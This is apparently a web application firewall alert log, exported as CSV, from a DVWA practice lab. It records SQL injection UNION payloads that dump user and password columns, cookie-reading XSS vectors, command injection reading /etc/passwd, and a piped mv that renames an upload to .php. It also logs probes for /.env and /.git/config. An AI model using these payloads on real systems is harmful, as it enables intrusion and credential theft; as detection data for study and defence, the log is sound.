Attack Type,URL Used,Payload Used,Severity
SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT DATABASE(),table_name from found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
SQL Injection Attack Detected via libinjection,,"sUEf( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT DATABASE(),table_name from found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
SQL Injection Attack Detected via libinjection,,"sUEvk found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
SQL Injection Attack: Common DB Names Detected,,"information_schema found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT null,column_name from found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
SQL Injection Attack Detected via libinjection,,"sUEvk found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
SQL Injection Attack: Common DB Names Detected,,"information_schema found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT null,column_name from found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
SQL Injection Attack Detected via libinjection,,"sUEnk found within ARGS:id: 1' union select user,password from users#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' union s found within ARGS:id: 1' union select user,password from users#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"union select user,password from found within ARGS:id: 1' union select user,password from users#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' union select found within ARGS:id: 1' union select user,password from users#",CRITICAL
SQL Injection Attack Detected via libinjection,,"sUEnk found within ARGS:id: 1' union select user,password from users#",CRITICAL
Detects MSSQL code execution and information gathering attempts,,"' union s found within ARGS:id: 1' union select user,password from users#",CRITICAL
"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"union select user,password from found within ARGS:id: 1' union select user,password from users#",CRITICAL
Detects concatenated basic SQL injection and SQLLFI attempts,,"1' union select found within ARGS:id: 1' union select user,password from users#",CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onError= found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<img src=ss onError= found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onError= found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<img src=ss onError= found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
Node-Validator Blacklist Keywords,,document.cookie found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
Node-Validator Blacklist Keywords,,document.cookie found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=<body, onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=<body,<body onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=<body, onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=<body,<body onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onerror= found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
XSS Attack Detected via libinjection,,XSS data found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/totallynormal.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Path Traversal Attack (/../),,/../ found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Remote Command Execution: Unix Command Injection,,|mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php found within ARGS:ip: |mv ../../hackable/uploads/kill.jpeg ../../hackable/uploads/totallynormal.php,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
